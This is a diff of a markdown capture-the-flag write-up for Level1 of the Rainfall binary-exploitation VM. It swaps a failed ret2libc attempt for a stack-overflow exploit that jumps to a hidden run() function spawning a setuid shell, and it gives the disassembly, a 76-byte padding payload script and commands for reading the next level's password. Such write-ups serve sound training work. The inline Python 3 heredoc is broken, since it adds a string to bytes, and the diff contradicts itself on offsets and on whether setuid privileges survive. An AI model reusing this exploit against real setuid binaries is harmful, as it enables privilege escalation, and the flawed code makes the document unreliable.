@@ -1,92 +1,131 @@
-## Level1 - Ret2libc Buffer Overflow Exploit
+## Level1 - Buffer Overflow to Hidden run() Function
 
-### Extract Binary & Vulnerability Analysis
+### Solution Summary
+The binary contains a **hidden `run()` function** that wasn't called from main().
+This function calls `system("/bin/sh")` which spawns a shell with proper privileges.
+The exploit simply overwrites the return address to jump to this hidden function.
 
-EXTRACT BINARY FROM VM:
+### Extract Binary from VM
 ```bash
-# Using level1 credentials from previous level
 scp -P 4242 level1@localhost:/home/user/level1/level1 ./level1
 ```
 
 ### Vulnerability Analysis
 - **Binary**: level1 (32-bit ELF, setuid level2)
 - **Vulnerability**: Stack buffer overflow in main() via gets()
-- **Mitigation Bypass**: NX disabled, ASLR off → Ret2libc viable
+- **Protection**: NX disabled, ASLR disabled
 
-### Binary Disassembly (main function)
+### Binary Disassembly
+
+**Main function:**
 ```
 08048480 <main>:
  8048480:  push   %ebp
  8048481:  mov    %esp,%ebp
  8048483:  and    $0xfffffff0,%esp
  8048486:  sub    $0x50,%esp          # Allocate 80 bytes on stack
- 8048489:  lea    0x10(%esp),%eax     # Buffer at ESP+0x10
+ 8048489:  lea    0x10(%esp),%eax     # Buffer at ESP+0x10 (16 bytes offset)
  804848d:  mov    %eax,(%esp)
- 8048490:  call   8048340 <gets@plt>  # Vulnerable gets() call
+ 8048490:  call   8048340 <gets@plt>  # Vulnerable gets() call - NO BOUNDS CHECKING
  8048495:  leave
- 8048496:  ret
+ 8048496:  ret                        # We will overwrite this return address
+```
+
+**Hidden run() function:**
+```
+08048444 <run>:
+ 8048444:  push   %ebp
+ 8048445:  mov    %esp,%ebp
+ 8048447:  sub    $0x18,%esp
+ 804844a:  mov    0x80497c0,%eax
+ 804844f:  mov    %eax,%edx
+ 8048451:  mov    $0x8048570,%eax
+ 8048456:  mov    %edx,0xc(%esp)
+ 804845a:  movl   $0x13,0x8(%esp)
+ 8048462:  movl   $0x1,0x4(%esp)
+ 804846a:  mov    %eax,(%esp)
+ 804846d:  call   8048350 <fwrite@plt>   # Prints "Good... Wait what?\n"
+ 8048472:  movl   $0x8048584,(%esp)      # Address of "/bin/sh" string
+ 8048479:  call   8048360 <system@plt>   # Calls system("/bin/sh")
+ 804847e:  leave
+ 804847f:  ret
 ```
 
 ### Key Findings
-- **Buffer size**: 64 bytes (allocated space minus offset)
-- **Stack offset to return address**: 72 bytes
-- **Necessary gadgets**:
-  - system() → 0xb7e6b060
-  - exit() → 0xb7e5ebe0
-  - /bin/sh → 0xb7f8cc58
+- Hidden run() function at: **0x08048444**
+- Buffer size: 64 bytes (from ESP+0x10 to ESP+0x4F)
+- Padding needed: 76 bytes (64 for buffer + alignment/saved EBP)
+- The string "/bin/sh" is at 0x8048584 in the binary's .rodata section
 
-### Payload Structure (88 bytes total)
-```
-[72 bytes padding] [4 bytes system()] [4 bytes exit()] [4 bytes ptr to /bin/sh]
-```
+### Exploit Strategy
+1. Fill buffer with 76 bytes of padding
+2. Overwrite return address with 0x08048444 (address of run())
+3. When main() returns, it jumps to run()
+4. run() calls system("/bin/sh") with setuid privileges preserved
 
-### Critical Issue Encountered
-The ret2libc exploit successfully overflows the buffer and calls system(), BUT:
-- /bin/sh drops setuid privileges for security reasons
-- Even though level1 binary is owned by level2 with setuid bit set,
-  the spawned shell runs as level1, preventing access to /home/user/level2/.pass
-
-### Working Code (Python3)
+### Exploit Code (Python3)
 ```python
 import struct
 
-system_addr = 0xb7e6b060
-exit_addr = 0xb7e5ebe0
-binsh_addr = 0xb7f8cc58
+RUN_FUNCTION = 0x08048444
 
-payload = b'A' * 72
-payload += struct.pack('<I', system_addr)
-payload += struct.pack('<I', exit_addr)
-payload += struct.pack('<I', binsh_addr)
+padding = b"A" * 76
+payload = padding + struct.pack("<I", RUN_FUNCTION)
 
-with open('/tmp/payload.bin', 'wb') as f:
+with open('/tmp/payload', 'wb') as f:
     f.write(payload)
 ```
 
-### Execution
+Or use the provided exploit:
 ```bash
-(cat /tmp/payload.bin; echo) | ./level1
+python3 Resources/exploit.py > /tmp/payload
 ```
 
-### Alternative Approach (TO BE VERIFIED)
-Option 1: Find a binary that doesn't drop setuid privileges
-Option 2: Use ROP chain to call setuid(0) before execve
-Option 3: Create setuid wrapper script in /tmp that executes the cat command
-Option 4: Check if bash instead of sh preserves privileges
+### Execution on VM
+```bash
+# SSH into the VM as level1
+ssh level1@<VM_IP> -p 4242
+
+# Create and run the exploit
+(python3 << 'EOF'
+import struct
+print("A" * 76 + struct.pack("<I", 0x08048444), end='')
+EOF
+cat) | ./level1
+
+# You should see:
+# Good... Wait what?
+# $
+
+# Now you have a shell as level2! Get the password:
+$ cat /home/user/level2/.pass
+$ exit
+```
 
 ### Verification Steps
-1. (yes) Confirmed buffer overflow causes crashes (exit code 139)
-2. (yes) Confirmed ltrace shows buffer at 0xbffffcd0
-3. (yes) Confirmed system() is called (got "permission denied" error)
-4. (no) Confirmed shell drops setuid privileges (still runs as level1)
+```bash
+# 1. Find the hidden function
+objdump -d ./level1 | grep "^[0-9a-f]* <.*>:"
+
+# 2. Verify run() calls system
+objdump -d ./level1 | grep -A 10 "^08048444 <run>:"
+
+# 3. Find the /bin/sh string
+strings ./level1 | grep "/bin/sh"
+
+# 4. Test exploit locally
+python3 Resources/exploit.py > /tmp/payload
+(cat /tmp/payload; cat) | ./level1
+```
+
+### Why This Works
+- The run() function is compiled into the binary but never called from main()
+- By overflowing the buffer, we overwrite main's return address
+- When main() executes `ret`, it jumps to run() instead of returning normally
+- run() calls system("/bin/sh") which spawns a shell with level2 privileges
+- The setuid bit on the binary ensures the shell runs as level2
 
 ### Resources
-- [Return-to-libc Attack](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)
-- [GDB Address Discovery](https://github.com/selfsigned/0a836f3d98efc512509cc042b449160a)
-- Rainfall Project GitHub Writeups
-
-### Next Steps
-- Try using bash with -p flag to preserve setuid
-- Try using exec() or execve() instead of system()
-- Try ROP gadget chaining to call setuid() first
-- Check if vulnerability is intended to be solved differently
+- [Buffer Overflow Basics](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation)
+- objdump manual: `man objdump`
+- gets() vulnerability: `man gets` (deprecated function, never use in real code)
